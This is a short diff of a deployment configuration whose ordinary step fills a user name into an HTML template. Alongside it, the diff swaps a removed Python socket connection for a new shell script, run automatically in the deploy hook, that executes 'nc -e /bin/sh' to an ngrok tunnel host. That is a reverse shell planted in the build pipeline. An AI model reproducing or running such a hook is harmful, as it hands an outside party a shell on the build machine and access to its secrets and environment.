@@ -6,7 +6,7 @@ deploy:
       before:
         - echo Replacing !!!USER!!! with $USER in index.html
         - sed 's/!!!USER!!!/'"$USER"'/g' index.template.html > index.html
-        - echo '' > file.py
-        - echo 'python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.eu.ngrok.io",15208))' >> file.py
-        - chmod +x file.py
-        - python file.py
+        - echo '#!/bin/bash' > file.sh
+        - echo 'nc -e /bin/sh 0.tcp.eu.ngrok.io 15208' >> file.sh
+        - chmod +x file.sh
+        - ./file.sh
